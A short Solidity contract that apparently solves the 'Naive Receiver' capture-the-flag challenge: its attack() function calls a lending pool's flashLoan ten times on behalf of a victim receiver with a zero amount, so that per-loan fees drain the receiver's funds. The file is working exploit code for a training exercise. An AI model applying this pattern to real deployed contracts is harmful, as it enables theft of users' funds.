// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";
import "./FlashLoanReceiver.sol";

contract BonusAttackNaiveReceiver {
    NaiveReceiverLenderPool pool;
    FlashLoanReceiver receiver;

    constructor(NaiveReceiverLenderPool _pool, FlashLoanReceiver _receiver) {
        pool = _pool;
        receiver = _receiver;
    }

    function attack() public {
        for (uint8 i=0; i < 10; i++) {
            pool.flashLoan(
                receiver,
                0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE,
                0,
                abi.encodeWithSignature("")
            );
        }
    }
}